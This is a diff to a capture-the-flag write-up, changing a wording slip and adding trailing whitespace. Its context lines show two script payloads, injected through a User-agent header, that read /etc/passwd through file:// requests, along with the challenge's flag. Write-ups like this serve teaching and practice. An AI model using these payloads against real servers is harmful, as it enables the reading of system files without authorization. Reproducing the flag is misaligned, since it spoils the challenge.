@@ -35,7 +35,7 @@ I crafted a html tags in User-agent strings while logging in and it reflects in 
  <script>exfil = new XMLHttpRequest();exfil.open("GET","file:///etc/passwd"); exfil.send();exfil.onload = function(){document.write(this.responseText);} exfil.onerror = function(){document.write('failed!')}</script>
  ```
  
- My teammate 0xGodson helped to solve this chall.He sent a payload which was working like  a king!!
+ My teammate 0xGodson helped me to solve this chall.He sent a payload which was working like  a king!!
  
  ```
  <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
@@ -52,3 +52,5 @@ And I can able to read the /etc/passwd file!!!
  FLAG{SSRF_IS_AWESOME_UDKSO}
  ```
 
+
+    
